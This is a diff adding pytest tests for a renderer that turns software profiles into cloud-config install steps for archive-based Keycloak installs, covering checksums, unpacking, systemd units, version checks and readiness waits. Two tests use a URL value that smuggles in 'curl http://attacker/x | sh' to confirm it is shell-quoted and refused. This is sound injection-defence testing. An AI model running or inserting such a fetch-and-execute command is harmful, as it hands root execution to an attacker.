@@ -141,3 +141,162 @@ def test_a_profile_naming_no_blueprint_extends_nothing(store):
     write(store, {**KEYCLOAK, "builds_on": ""})
     for b in blueprint_registry.discover():
         assert "keycloak" not in b["builds"]
+
+
+# --- archive installs: the tarball path (C6b) --------------------------------
+
+ARCHIVE_PROFILE = {
+    "code": "keycloak",
+    "builds_on": "oci/service-vm",
+    "ports": [8080],
+    "expects": "26",
+    "version_command": "/opt/keycloak/bin/kc.sh --version 2>&1",
+    "archive": {
+        "url": "https://example.com/keycloak-26.7.2.tar.gz",
+        "sha256": "f" * 64,
+        "dest": "/opt/keycloak",
+        "user": "keycloak",
+        "unit": {"description": "Keycloak",
+                 "exec_start": "/opt/keycloak/bin/kc.sh start-dev"},
+    },
+    "rhel": {"packages": ["java-21-openjdk-headless"], "services": ["keycloak"]},
+}
+
+
+def rendered(store, monkeypatch, profile=None):
+    write(store, profile or ARCHIVE_PROFILE)
+    monkeypatch.setenv("CONFIG_ENABLED", "true")
+    return configure.render([{"technology_code": "keycloak"}], "rhel",
+                            "https://example/report")
+
+
+def test_an_archive_install_renders_fetch_check_unpack_unit_start(store, monkeypatch):
+    """The whole chain, in dependency order: deps install, fetch, checksum,
+    unpack, unit written, daemon-reload, enable. Any link missing is a machine
+    that boots healthy with nothing on it — the original silent success."""
+    out = rendered(store, monkeypatch)
+
+    for step in ("curl -fsSL", "sha256sum -c", "tar -xzf",
+                 "/etc/systemd/system/keycloak.service", "kc.sh start-dev",
+                 "systemctl daemon-reload", "enable --now keycloak"):
+        assert step in out, f"missing: {step}"
+    assert out.index("daemon-reload") < out.index("enable --now keycloak"), (
+        "enable ran before systemd had read the unit")
+    assert out.index("tar -xzf") > out.index("curl -fsSL")
+
+
+def test_the_rendered_cloud_config_is_valid_yaml(store, monkeypatch):
+    """'Failed to shellify' is why no service-vm ever installed anything, once.
+    Every new line class has to re-earn this."""
+    import yaml
+
+    doc = yaml.safe_load(rendered(store, monkeypatch))
+    assert isinstance(doc, dict)
+    assert all(isinstance(c, str) for c in doc["runcmd"])
+
+
+def test_a_mismatched_checksum_deletes_the_archive_before_unpack(store, monkeypatch):
+    """Root is about to execute what is inside. A marker alone would not stop
+    the tar step that follows — the file itself must be gone."""
+    out = rendered(store, monkeypatch)
+    check = next(line for line in out.splitlines() if "sha256sum -c" in line)
+    assert "rm -f /tmp/portal-archive-keycloak.tgz" in check, (
+        "a tampered archive would still be unpacked")
+
+
+def test_the_report_judges_an_archive_by_its_destination_not_rpm(store, monkeypatch):
+    """rpm -q keycloak reports NOT INSTALLED on every healthy machine, because
+    keycloak is not an RPM. Asking the package question about an archive fails
+    working installs forever."""
+    out = rendered(store, monkeypatch)
+    assert "archive_keycloak=" in out
+    assert "rpm -q keycloak " not in out
+
+
+def test_the_archive_evidence_is_a_NON_EMPTY_destination(store, monkeypatch):
+    """FOUND BY REVIEW. `test -d {dest}` was a tautology: the unpack step ran
+    `mkdir -p {dest}` in the same command immediately before tar, so the
+    directory existed on every machine — including ones where the fetch 404'd,
+    the checksum mismatched and the tarball was deleted. A check that cannot
+    fail is the third one this project shipped in a day."""
+    out = rendered(store, monkeypatch)
+    check = next(l for l in out.splitlines() if "archive_keycloak=" in l)
+    assert "ls -A" in check, f"the evidence is still satisfiable by an empty directory: {check}"
+    assert "test -d /opt/keycloak &&" not in check
+
+
+def test_an_unpack_that_extracted_nothing_leaves_a_failure_marker(store, monkeypatch):
+    """`tar --strip-components=1` on an archive whose members sit at the top
+    level extracts NOTHING and exits 0 — a silent install of nothing, which is
+    exactly what a proof must never certify."""
+    out = rendered(store, monkeypatch)
+    assert "unpacked no files" in out
+
+
+def test_a_dangerous_value_reaching_the_renderer_is_still_neutralised(store, monkeypatch):
+    """THIRD LOCK, tested past the second one.
+
+    profile_rules refuses a URL containing a semicolon, and _generated_profiles
+    refuses to load such a profile — so this bypasses both to ask the question
+    they exist to make moot: if a dangerous value DID reach render(), does it
+    become a root command? Two locks on one door is the rule everywhere else in
+    this system (the publish path, the proof authority), and the renderer is the
+    last one.
+    """
+    evil = {**ARCHIVE_PROFILE, "archive": {
+        **ARCHIVE_PROFILE["archive"],
+        "url": "https://x/k.tar.gz; curl http://attacker/x | sh"}}
+    monkeypatch.setattr(configure, "_generated_profiles", lambda: {"keycloak": evil})
+    monkeypatch.setenv("CONFIG_ENABLED", "true")
+    out = configure.render([{"technology_code": "keycloak"}], "rhel", "https://r")
+
+    fetch = next(l for l in out.splitlines() if "curl -fsSL" in l)
+    assert "'https://x/k.tar.gz; curl http://attacker/x | sh'" in fetch, (
+        f"the payload was not shell-quoted and would run as root: {fetch}")
+
+
+def test_the_second_lock_refuses_that_profile_before_it_can_render(store, monkeypatch):
+    """And the lock the test above deliberately bypassed does hold."""
+    write(store, {**ARCHIVE_PROFILE, "archive": {
+        **ARCHIVE_PROFILE["archive"],
+        "url": "https://x/k.tar.gz; curl http://attacker/x | sh"}})
+    assert configure._generated_profiles() == {}, (
+        "an invalid profile was loaded from the store")
+
+
+def test_a_generated_profiles_version_check_reaches_the_machine(store, monkeypatch):
+    """THE latent C6 bug this increment surfaced: the report's version lookup
+    read TEMPLATES alone, so an agent-written profile's expects/version_command
+    never reached the machine and nobody ever asked which version arrived —
+    the exact silence that shipped Redis 6.2 as 7."""
+    out = rendered(store, monkeypatch)
+    assert "version_keycloak=" in out, "the generated profile was never version-checked"
+    assert "kc.sh --version" in out
+
+
+def test_slow_archive_software_gets_a_bounded_wait_before_the_report(store, monkeypatch):
+    """keycloak builds itself on first start; a report filed the instant enable
+    returned would call a healthy machine broken on the port check. Bounded:
+    a service that never answers still fails, minutes later, on the same
+    evidence."""
+    out = rendered(store, monkeypatch)
+    wait = next((l for l in out.splitlines() if "seq 1 60" in l), None)
+    assert wait is not None and "8080" in wait
+    assert out.index("seq 1 60") < out.index("infra-portal-report.sh || true")
+
+
+def test_an_archive_only_family_block_still_resolves(store, monkeypatch):
+    """The software IS the archive; a family block with no packages must not
+    read as 'this family is not covered'."""
+    profile = {**ARCHIVE_PROFILE, "rhel": {"packages": [], "services": ["keycloak"]}}
+    write(store, profile)
+    prof = configure.profile_for("keycloak", "rhel")
+    assert prof is not None and prof["archive"] is not None
+
+
+def test_a_family_without_a_block_is_still_refused(store, monkeypatch):
+    """Archive steps are family-neutral, but coverage is not: what this family
+    was PROVEN to run is a per-family claim the proof makes one family at a
+    time."""
+    write(store, ARCHIVE_PROFILE)
+    assert configure.profile_for("keycloak", "debian") is None
